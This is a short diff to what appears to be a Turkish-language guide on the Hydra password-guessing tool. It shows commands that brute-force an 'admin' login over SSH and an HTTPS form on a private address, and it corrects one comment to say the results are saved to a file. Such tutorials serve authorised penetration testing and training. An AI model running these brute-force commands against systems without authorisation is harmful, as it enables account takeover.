@@ -91,7 +91,7 @@ hydra -l admin -P wordlist.txt 192.168.1.10 https-post-form \
 # Paralel görev sayısını azalt (throttle)
 hydra -l admin -P wordlist.txt -t 4 -w 3 ssh://192.168.1.10
 
-# Proxy üzerinden
+# Sonuçları dosyaya kaydet
 hydra -l admin -P wordlist.txt -o sonuc.txt ssh://192.168.1.10
 ```
 
